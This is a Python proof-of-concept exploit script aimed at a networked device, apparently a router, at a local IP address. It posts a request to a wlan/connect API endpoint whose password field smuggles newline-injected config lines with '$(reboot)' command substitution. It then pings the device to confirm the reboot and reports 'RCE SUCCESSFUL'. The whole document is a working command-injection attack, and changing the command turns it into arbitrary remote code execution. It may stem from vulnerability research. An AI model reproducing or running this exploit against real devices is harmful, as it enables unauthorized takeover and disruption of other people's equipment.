import requests
import time
import subprocess

TARGET_IP = "192.168.1.173"

def exploit():
    # Injection payload: Reboot
    cmd = "reboot"
    
    # Payload
    injection = f"""dummy
option ifname '$({cmd})'
option macaddr '$({cmd})'
"""
    
    data = {
        'name': 'RebootTest',
        'password': injection
    }
    
    print(f"[+] Sending reboot payload to {TARGET_IP}...")
    
    try:
        requests.post(f"http://{TARGET_IP}/api/index.php?url=wlan/connect", json=data, timeout=5)
    except:
        pass

    print("[+] Payload sent. Monitoring ping for 60 seconds...")
    
    start_time = time.time()
    lost_pings = 0
    consecutive_success = 0
    
    while time.time() - start_time < 60:
        res = subprocess.run(["ping", "-c", "1", "-W", "1", TARGET_IP], stdout=subprocess.DEVNULL)
        if res.returncode != 0:
            lost_pings += 1
            consecutive_success = 0
            print(".", end="", flush=True)
        else:
            consecutive_success += 1
            if consecutive_success > 5 and lost_pings > 5:
                print("\n[+] Device came back after downtime!")
                break
            # print("!", end="", flush=True)
        time.sleep(1)
        
    print(f"\n[+] Total lost pings: {lost_pings}")
    if lost_pings > 10:
        print("[+] CONFIRMED: Device rebooted! RCE SUCCESSFUL.")
    elif lost_pings > 0:
        print("[-] Device restarted network but maybe not rebooted.")
    else:
        print("[-] Device did not lose connection? Weird.")

if __name__ == "__main__":
    exploit()
